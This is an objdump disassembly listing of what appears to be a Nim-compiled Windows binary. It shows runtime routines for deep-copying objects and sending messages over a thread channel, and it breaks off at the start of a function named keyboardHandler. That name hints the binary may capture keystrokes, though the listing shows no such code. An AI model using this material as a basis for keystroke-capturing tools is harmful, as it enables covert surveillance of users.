  405759:	74 0d                	je     405768 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x62>
  40575b:	3c 16                	cmp    $0x16,%al
  40575d:	0f 85 5a 02 00 00    	jne    4059bd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2b7>
  405763:	e9 2c 01 00 00       	jmp    405894 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x18e>
  405768:	45 84 c9             	test   %r9b,%r9b
  40576b:	48 8b 2a             	mov    (%rdx),%rbp
  40576e:	74 39                	je     4057a9 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xa3>
  405770:	48 85 ed             	test   %rbp,%rbp
  405773:	74 7e                	je     4057f3 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xed>
  405775:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405779:	48 8d 75 10          	lea    0x10(%rbp),%rsi
  40577d:	e8 d1 e8 ff ff       	call   404053 <rawNewStringNoInit>
  405782:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405786:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40578a:	48 89 d7             	mov    %rdx,%rdi
  40578d:	48 89 c2             	mov    %rax,%rdx
  405790:	48 89 08             	mov    %rcx,(%rax)
  405793:	48 ff c1             	inc    %rcx
  405796:	f3 a4                	rep movsb (%rsi),(%rdi)
  405798:	48 89 d9             	mov    %rbx,%rcx
  40579b:	e8 22 d7 ff ff       	call   402ec2 <unsureAsgnRef>
  4057a0:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
  4057a4:	e9 38 01 00 00       	jmp    4058e1 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x1db>
  4057a9:	48 85 ed             	test   %rbp,%rbp
  4057ac:	74 39                	je     4057e7 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xe1>
  4057ae:	48 8b 45 00          	mov    0x0(%rbp),%rax
  4057b2:	48 8d 0d f7 56 02 00 	lea    0x256f7(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  4057b9:	48 89 ee             	mov    %rbp,%rsi
  4057bc:	48 8d 50 11          	lea    0x11(%rax),%rdx
  4057c0:	e8 61 d3 ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  4057c5:	48 8b 7d 00          	mov    0x0(%rbp),%rdi
  4057c9:	48 8d 4f 11          	lea    0x11(%rdi),%rcx
  4057cd:	48 89 c7             	mov    %rax,%rdi
  4057d0:	f3 a4                	rep movsb (%rsi),(%rdi)
  4057d2:	48 89 03             	mov    %rax,(%rbx)
  4057d5:	e9 ec 01 00 00       	jmp    4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2c0>
  4057da:	48 8b 32             	mov    (%rdx),%rsi
  4057dd:	48 85 f6             	test   %rsi,%rsi
  4057e0:	75 2b                	jne    40580d <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x107>
  4057e2:	40 84 ff             	test   %dil,%dil
  4057e5:	75 0c                	jne    4057f3 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xed>
  4057e7:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  4057ee:	e9 d3 01 00 00       	jmp    4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2c0>
  4057f3:	31 d2                	xor    %edx,%edx
  4057f5:	48 89 d9             	mov    %rbx,%rcx
  4057f8:	48 83 c4 28          	add    $0x28,%rsp
  4057fc:	5b                   	pop    %rbx
  4057fd:	5e                   	pop    %rsi
  4057fe:	5f                   	pop    %rdi
  4057ff:	5d                   	pop    %rbp
  405800:	41 5c                	pop    %r12
  405802:	41 5d                	pop    %r13
  405804:	41 5e                	pop    %r14
  405806:	41 5f                	pop    %r15
  405808:	e9 b5 d6 ff ff       	jmp    402ec2 <unsureAsgnRef>
  40580d:	45 84 c9             	test   %r9b,%r9b
  405810:	48 8b 16             	mov    (%rsi),%rdx
  405813:	74 15                	je     40582a <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x124>
  405815:	4c 89 c1             	mov    %r8,%rcx
  405818:	e8 ba fe ff ff       	call   4056d7 <newSeq>
  40581d:	48 89 d9             	mov    %rbx,%rcx
  405820:	48 89 c2             	mov    %rax,%rdx
  405823:	e8 9a d6 ff ff       	call   402ec2 <unsureAsgnRef>
  405828:	eb 1b                	jmp    405845 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x13f>
  40582a:	49 8b 40 10          	mov    0x10(%r8),%rax
  40582e:	48 8d 0d 7b 56 02 00 	lea    0x2567b(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405835:	48 0f af 10          	imul   (%rax),%rdx
  405839:	48 83 c2 10          	add    $0x10,%rdx
  40583d:	e8 f8 d6 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405842:	48 89 03             	mov    %rax,(%rbx)
  405845:	48 8b 1b             	mov    (%rbx),%rbx
  405848:	4c 8d 7e 10          	lea    0x10(%rsi),%r15
  40584c:	45 31 f6             	xor    %r14d,%r14d
  40584f:	4c 8b 2e             	mov    (%rsi),%r13
  405852:	48 83 c3 10          	add    $0x10,%rbx
  405856:	4c 89 6b f0          	mov    %r13,-0x10(%rbx)
  40585a:	4c 89 6b f8          	mov    %r13,-0x8(%rbx)
  40585e:	49 ff cd             	dec    %r13
  405861:	4d 39 f5             	cmp    %r14,%r13
  405864:	7d 0f                	jge    405875 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x16f>
  405866:	40 84 ff             	test   %dil,%dil
  405869:	0f 84 57 01 00 00    	je     4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2c0>
  40586f:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
  405873:	eb 6c                	jmp    4058e1 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x1db>
  405875:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  405879:	45 89 e1             	mov    %r12d,%r9d
  40587c:	49 8b 08             	mov    (%r8),%rcx
  40587f:	49 0f af ce          	imul   %r14,%rcx
  405883:	49 ff c6             	inc    %r14
  405886:	49 8d 14 0f          	lea    (%r15,%rcx,1),%rdx
  40588a:	48 01 d9             	add    %rbx,%rcx
  40588d:	e8 74 fe ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  405892:	eb cd                	jmp    405861 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x15b>
  405894:	48 8b 32             	mov    (%rdx),%rsi
  405897:	48 85 f6             	test   %rsi,%rsi
  40589a:	0f 84 42 ff ff ff    	je     4057e2 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xdc>
  4058a0:	4c 8d 66 f0          	lea    -0x10(%rsi),%r12
  4058a4:	45 84 c9             	test   %r9b,%r9b
  4058a7:	0f 84 cc 00 00 00    	je     405979 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x273>
  4058ad:	48 8b 2e             	mov    (%rsi),%rbp
  4058b0:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4058b4:	48 89 e9             	mov    %rbp,%rcx
  4058b7:	48 8b 10             	mov    (%rax),%rdx
  4058ba:	e8 27 e4 ff ff       	call   403ce6 <newObj>
  4058bf:	48 89 d9             	mov    %rbx,%rcx
  4058c2:	48 89 c2             	mov    %rax,%rdx
  4058c5:	e8 f8 d5 ff ff       	call   402ec2 <unsureAsgnRef>
  4058ca:	48 8b 0b             	mov    (%rbx),%rcx
  4058cd:	48 8d 56 08          	lea    0x8(%rsi),%rdx
  4058d1:	44 0f b6 cf          	movzbl %dil,%r9d
  4058d5:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  4058d9:	e8 28 fe ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  4058de:	4c 89 e2             	mov    %r12,%rdx
  4058e1:	48 8d 0d c8 55 02 00 	lea    0x255c8(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  4058e8:	48 83 c4 28          	add    $0x28,%rsp
  4058ec:	5b                   	pop    %rbx
  4058ed:	5e                   	pop    %rsi
  4058ee:	5f                   	pop    %rdi
  4058ef:	5d                   	pop    %rbp
  4058f0:	41 5c                	pop    %r12
  4058f2:	41 5d                	pop    %r13
  4058f4:	41 5e                	pop    %r14
  4058f6:	41 5f                	pop    %r15
  4058f8:	e9 17 cb ff ff       	jmp    402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  4058fd:	4d 8b 40 10          	mov    0x10(%r8),%r8
  405901:	41 0f b6 f9          	movzbl %r9b,%edi
  405905:	4d 85 c0             	test   %r8,%r8
  405908:	75 08                	jne    405912 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x20c>
  40590a:	48 8b 02             	mov    (%rdx),%rax
  40590d:	48 89 01             	mov    %rax,(%rcx)
  405910:	eb 08                	jmp    40591a <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x214>
  405912:	41 89 f9             	mov    %edi,%r9d
  405915:	e8 ec fd ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  40591a:	41 89 f9             	mov    %edi,%r9d
  40591d:	eb 04                	jmp    405923 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x21d>
  40591f:	45 0f b6 c9          	movzbl %r9b,%r9d
  405923:	4c 8b 45 18          	mov    0x18(%rbp),%r8
  405927:	48 89 f2             	mov    %rsi,%rdx
  40592a:	48 89 d9             	mov    %rbx,%rcx
  40592d:	48 83 c4 28          	add    $0x28,%rsp
  405931:	5b                   	pop    %rbx
  405932:	5e                   	pop    %rsi
  405933:	5f                   	pop    %rdi
  405934:	5d                   	pop    %rbp
  405935:	41 5c                	pop    %r12
  405937:	41 5d                	pop    %r13
  405939:	41 5e                	pop    %r14
  40593b:	41 5f                	pop    %r15
  40593d:	e9 95 00 00 00       	jmp    4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23>
  405942:	48 8b 45 00          	mov    0x0(%rbp),%rax
  405946:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
  40594a:	48 99                	cqto
  40594c:	48 f7 3f             	idivq  (%rdi)
  40594f:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  405953:	31 ff                	xor    %edi,%edi
  405955:	49 39 fd             	cmp    %rdi,%r13
  405958:	7c 6c                	jl     4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2c0>
  40595a:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  40595e:	45 89 e1             	mov    %r12d,%r9d
  405961:	49 8b 08             	mov    (%r8),%rcx
  405964:	48 0f af cf          	imul   %rdi,%rcx
  405968:	48 ff c7             	inc    %rdi
  40596b:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  40596f:	48 01 d9             	add    %rbx,%rcx
  405972:	e8 8f fd ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  405977:	eb dc                	jmp    405955 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x24f>
  405979:	48 8b 7e f8          	mov    -0x8(%rsi),%rdi
  40597d:	48 8d 0d 2c 55 02 00 	lea    0x2552c(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405984:	48 8b 47 10          	mov    0x10(%rdi),%rax
  405988:	48 8b 10             	mov    (%rax),%rdx
  40598b:	48 83 c2 08          	add    $0x8,%rdx
  40598f:	e8 a6 d5 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405994:	45 31 c9             	xor    %r9d,%r9d
  405997:	48 89 f2             	mov    %rsi,%rdx
  40599a:	48 89 03             	mov    %rax,(%rbx)
  40599d:	48 8d 48 08          	lea    0x8(%rax),%rcx
  4059a1:	48 89 38             	mov    %rdi,(%rax)
  4059a4:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  4059a8:	48 83 c4 28          	add    $0x28,%rsp
  4059ac:	5b                   	pop    %rbx
  4059ad:	5e                   	pop    %rsi
  4059ae:	5f                   	pop    %rdi
  4059af:	5d                   	pop    %rbp
  4059b0:	41 5c                	pop    %r12
  4059b2:	41 5d                	pop    %r13
  4059b4:	41 5e                	pop    %r14
  4059b6:	41 5f                	pop    %r15
  4059b8:	e9 49 fd ff ff       	jmp    405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  4059bd:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  4059c1:	48 89 df             	mov    %rbx,%rdi
  4059c4:	f3 a4                	rep movsb (%rsi),(%rdi)
  4059c6:	48 83 c4 28          	add    $0x28,%rsp
  4059ca:	5b                   	pop    %rbx
  4059cb:	5e                   	pop    %rsi
  4059cc:	5f                   	pop    %rdi
  4059cd:	5d                   	pop    %rbp
  4059ce:	41 5c                	pop    %r12
  4059d0:	41 5d                	pop    %r13
  4059d2:	41 5e                	pop    %r14
  4059d4:	41 5f                	pop    %r15
  4059d6:	c3                   	ret

00000000004059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23>:
  4059d7:	41 55                	push   %r13
  4059d9:	41 54                	push   %r12
  4059db:	55                   	push   %rbp
  4059dc:	57                   	push   %rdi
  4059dd:	56                   	push   %rsi
  4059de:	53                   	push   %rbx
  4059df:	48 83 ec 28          	sub    $0x28,%rsp
  4059e3:	41 8a 00             	mov    (%r8),%al
  4059e6:	3c 02                	cmp    $0x2,%al
  4059e8:	49 89 cc             	mov    %rcx,%r12
  4059eb:	48 89 d5             	mov    %rdx,%rbp
  4059ee:	4c 89 c3             	mov    %r8,%rbx
  4059f1:	41 0f b6 f9          	movzbl %r9b,%edi
  4059f5:	74 30                	je     405a27 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0x50>
  4059f7:	3c 03                	cmp    $0x3,%al
  4059f9:	74 56                	je     405a51 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0x7a>
  4059fb:	fe c8                	dec    %al
  4059fd:	0f 85 93 00 00 00    	jne    405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0xbf>
  405a03:	49 8b 48 08          	mov    0x8(%r8),%rcx
  405a07:	45 0f b6 c9          	movzbl %r9b,%r9d
  405a0b:	4d 8b 40 10          	mov    0x10(%r8),%r8
  405a0f:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
  405a13:	4c 01 e1             	add    %r12,%rcx
  405a16:	48 83 c4 28          	add    $0x28,%rsp
  405a1a:	5b                   	pop    %rbx
  405a1b:	5e                   	pop    %rsi
  405a1c:	5f                   	pop    %rdi
  405a1d:	5d                   	pop    %rbp
  405a1e:	41 5c                	pop    %r12
  405a20:	41 5d                	pop    %r13
  405a22:	e9 df fc ff ff       	jmp    405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  405a27:	49 8b 40 20          	mov    0x20(%r8),%rax
  405a2b:	31 f6                	xor    %esi,%esi
  405a2d:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  405a31:	49 39 f5             	cmp    %rsi,%r13
  405a34:	7c 60                	jl     405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0xbf>
  405a36:	48 8b 43 28          	mov    0x28(%rbx),%rax
  405a3a:	41 89 f9             	mov    %edi,%r9d
  405a3d:	48 89 ea             	mov    %rbp,%rdx
  405a40:	4c 89 e1             	mov    %r12,%rcx
  405a43:	4c 8b 04 f0          	mov    (%rax,%rsi,8),%r8
  405a47:	48 ff c6             	inc    %rsi
  405a4a:	e8 88 ff ff ff       	call   4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23>
  405a4f:	eb e0                	jmp    405a31 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0x5a>
  405a51:	49 8b 70 08          	mov    0x8(%r8),%rsi
  405a55:	49 8b 50 10          	mov    0x10(%r8),%rdx
  405a59:	48 8d 04 31          	lea    (%rcx,%rsi,1),%rax
  405a5d:	48 01 ee             	add    %rbp,%rsi
  405a60:	48 8b 0a             	mov    (%rdx),%rcx
  405a63:	48 89 c7             	mov    %rax,%rdi
  405a66:	4c 89 c2             	mov    %r8,%rdx
  405a69:	f3 a4                	rep movsb (%rsi),(%rdi)
  405a6b:	48 89 e9             	mov    %rbp,%rcx
  405a6e:	e8 2b bc ff ff       	call   40169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>
  405a73:	48 85 c0             	test   %rax,%rax
  405a76:	49 89 c0             	mov    %rax,%r8
  405a79:	74 1b                	je     405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23+0xbf>
  405a7b:	45 0f b6 c9          	movzbl %r9b,%r9d
  405a7f:	48 89 ea             	mov    %rbp,%rdx
  405a82:	4c 89 e1             	mov    %r12,%rcx
  405a85:	48 83 c4 28          	add    $0x28,%rsp
  405a89:	5b                   	pop    %rbx
  405a8a:	5e                   	pop    %rsi
  405a8b:	5f                   	pop    %rdi
  405a8c:	5d                   	pop    %rbp
  405a8d:	41 5c                	pop    %r12
  405a8f:	41 5d                	pop    %r13
  405a91:	e9 41 ff ff ff       	jmp    4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.23>
  405a96:	48 83 c4 28          	add    $0x28,%rsp
  405a9a:	5b                   	pop    %rbx
  405a9b:	5e                   	pop    %rsi
  405a9c:	5f                   	pop    %rdi
  405a9d:	5d                   	pop    %rbp
  405a9e:	41 5c                	pop    %r12
  405aa0:	41 5d                	pop    %r13
  405aa2:	c3                   	ret

0000000000405aa3 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20>:
  405aa3:	41 55                	push   %r13
  405aa5:	41 54                	push   %r12
  405aa7:	55                   	push   %rbp
  405aa8:	57                   	push   %rdi
  405aa9:	56                   	push   %rsi
  405aaa:	53                   	push   %rbx
  405aab:	48 83 ec 38          	sub    $0x38,%rsp
  405aaf:	48 83 3d a1 53 02 00 	cmpq   $0xfffffffffffffffe,0x253a1(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405ab6:	fe 
  405ab7:	49 89 cc             	mov    %rcx,%r12
  405aba:	74 23                	je     405adf <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x3c>
  405abc:	48 8d 0d ad 53 02 00 	lea    0x253ad(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  405ac3:	ff 15 a3 27 04 00    	call   *0x427a3(%rip)        # 44826c <__imp_EnterCriticalSection>
  405ac9:	48 83 3d 8f 53 02 00 	cmpq   $0x0,0x2538f(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  405ad0:	00 
  405ad1:	48 8d 1d c0 53 02 00 	lea    0x253c0(%rip),%rbx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  405ad8:	7f 75                	jg     405b4f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0xac>
  405ada:	e9 8a 00 00 00       	jmp    405b69 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0xc6>
  405adf:	48 8d 0d da 52 02 00 	lea    0x252da(%rip),%rcx        # 42adc0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_>
  405ae6:	ba 30 00 00 00       	mov    $0x30,%edx
  405aeb:	e8 f6 e1 ff ff       	call   403ce6 <newObj>
  405af0:	48 8d 0d 49 be 00 00 	lea    0xbe49(%rip),%rcx        # 411940 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_40>
  405af7:	48 89 c3             	mov    %rax,%rbx
  405afa:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405afe:	48 8d 05 7b 52 02 00 	lea    0x2527b(%rip),%rax        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  405b05:	48 89 03             	mov    %rax,(%rbx)
  405b08:	48 8d 05 1c 67 00 00 	lea    0x671c(%rip),%rax        # 40c22b <.rdata+0x22b>
  405b0f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405b13:	e8 28 e1 ff ff       	call   403c40 <copyStringRC1>
  405b18:	48 85 f6             	test   %rsi,%rsi
  405b1b:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405b1f:	74 08                	je     405b29 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x86>
  405b21:	48 89 f1             	mov    %rsi,%rcx
  405b24:	e8 08 d4 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  405b29:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  405b30:	00 00 
  405b32:	4c 8d 0d 0c 66 00 00 	lea    0x660c(%rip),%r9        # 40c145 <.rdata+0x145>
  405b39:	48 89 d9             	mov    %rbx,%rcx
  405b3c:	4c 8d 05 0c 66 00 00 	lea    0x660c(%rip),%r8        # 40c14f <.rdata+0x14f>
  405b43:	48 8d 15 e1 66 00 00 	lea    0x66e1(%rip),%rdx        # 40c22b <.rdata+0x22b>
  405b4a:	e8 69 f7 ff ff       	call   4052b8 <raiseExceptionEx>
  405b4f:	48 8b 05 fa 52 02 00 	mov    0x252fa(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405b56:	48 39 05 03 53 02 00 	cmp    %rax,0x25303(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  405b5d:	7f 0a                	jg     405b69 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0xc6>
  405b5f:	48 89 d9             	mov    %rbx,%rcx
  405b62:	e8 e2 bd ff ff       	call   401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.24>
  405b67:	eb e6                	jmp    405b4f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0xac>
  405b69:	48 8b 05 e8 52 02 00 	mov    0x252e8(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405b70:	48 8d 2d 89 52 02 00 	lea    0x25289(%rip),%rbp        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405b77:	48 8d 58 01          	lea    0x1(%rax),%rbx
  405b7b:	48 3b 1d ce 52 02 00 	cmp    0x252ce(%rip),%rbx        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405b82:	0f 8f b7 00 00 00    	jg     405c3f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x19c>
  405b88:	48 85 db             	test   %rbx,%rbx
  405b8b:	75 05                	jne    405b92 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0xef>
  405b8d:	bb 01 00 00 00       	mov    $0x1,%ebx
  405b92:	48 8b 15 67 52 02 00 	mov    0x25267(%rip),%rdx        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405b99:	48 8d 0d 10 53 02 00 	lea    0x25310(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405ba0:	48 0f af d3          	imul   %rbx,%rdx
  405ba4:	48 01 d2             	add    %rdx,%rdx
  405ba7:	e8 8e d3 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405bac:	4c 8b 15 9d 52 02 00 	mov    0x2529d(%rip),%r10        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405bb3:	4c 8b 0d 86 52 02 00 	mov    0x25286(%rip),%r9        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  405bba:	49 89 c5             	mov    %rax,%r13
  405bbd:	4c 89 d0             	mov    %r10,%rax
  405bc0:	4d 89 d0             	mov    %r10,%r8
  405bc3:	48 8b 15 9e 52 02 00 	mov    0x2529e(%rip),%rdx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405bca:	49 29 c0             	sub    %rax,%r8
  405bcd:	48 85 c0             	test   %rax,%rax
  405bd0:	7f 17                	jg     405be9 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x146>
  405bd2:	48 85 d2             	test   %rdx,%rdx
  405bd5:	74 3b                	je     405c12 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x16f>
  405bd7:	48 8d 0d d2 52 02 00 	lea    0x252d2(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405bde:	48 83 ea 10          	sub    $0x10,%rdx
  405be2:	e8 2d c8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  405be7:	eb 29                	jmp    405c12 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x16f>
  405be9:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405bed:	48 ff c8             	dec    %rax
  405bf0:	4c 0f af c1          	imul   %rcx,%r8
  405bf4:	48 89 ce             	mov    %rcx,%rsi
  405bf7:	49 0f af f1          	imul   %r9,%rsi
  405bfb:	49 ff c1             	inc    %r9
  405bfe:	4d 01 e8             	add    %r13,%r8
  405c01:	48 01 d6             	add    %rdx,%rsi
  405c04:	4c 89 c7             	mov    %r8,%rdi
  405c07:	f3 a4                	rep movsb (%rsi),(%rdi)
  405c09:	4c 23 0d 48 52 02 00 	and    0x25248(%rip),%r9        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c10:	eb ae                	jmp    405bc0 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20+0x11d>
  405c12:	48 8b 05 37 52 02 00 	mov    0x25237(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405c19:	48 01 db             	add    %rbx,%rbx
  405c1c:	4c 89 2d 45 52 02 00 	mov    %r13,0x25245(%rip)        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405c23:	48 c7 05 12 52 02 00 	movq   $0x0,0x25212(%rip)        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  405c2a:	00 00 00 00 
  405c2e:	48 ff cb             	dec    %rbx
  405c31:	48 89 1d 20 52 02 00 	mov    %rbx,0x25220(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c38:	48 89 05 09 52 02 00 	mov    %rax,0x25209(%rip)        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c3f:	48 8b 0d 02 52 02 00 	mov    0x25202(%rip),%rcx        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c46:	4c 8d 05 b3 51 02 00 	lea    0x251b3(%rip),%r8        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405c4d:	45 31 c9             	xor    %r9d,%r9d
  405c50:	4c 89 e2             	mov    %r12,%rdx
  405c53:	48 0f af 0d a5 51 02 	imul   0x251a5(%rip),%rcx        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405c5a:	00 
  405c5b:	48 03 0d 06 52 02 00 	add    0x25206(%rip),%rcx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405c62:	e8 9f fa ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  405c67:	48 8b 05 da 51 02 00 	mov    0x251da(%rip),%rax        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c6e:	48 89 2d 2b 52 02 00 	mov    %rbp,0x2522b(%rip)        # 42aea0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x60>
  405c75:	48 8d 0d f4 51 02 00 	lea    0x251f4(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  405c7c:	48 ff 05 cd 51 02 00 	incq   0x251cd(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405c83:	48 ff c0             	inc    %rax
  405c86:	48 23 05 cb 51 02 00 	and    0x251cb(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c8d:	48 89 05 b4 51 02 00 	mov    %rax,0x251b4(%rip)        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c94:	ff 15 22 26 04 00    	call   *0x42622(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  405c9a:	48 8b 0d f7 51 02 00 	mov    0x251f7(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  405ca1:	ff 15 91 51 02 00    	call   *0x25191(%rip)        # 42ae38 <Dl_1285039_>
  405ca7:	b0 01                	mov    $0x1,%al
  405ca9:	48 83 c4 38          	add    $0x38,%rsp
  405cad:	5b                   	pop    %rbx
  405cae:	5e                   	pop    %rsi
  405caf:	5f                   	pop    %rdi
  405cb0:	5d                   	pop    %rbp
  405cb1:	41 5c                	pop    %r12
  405cb3:	41 5d                	pop    %r13
  405cb5:	c3                   	ret

0000000000405cb6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw>:
  405cb6:	41 55                	push   %r13
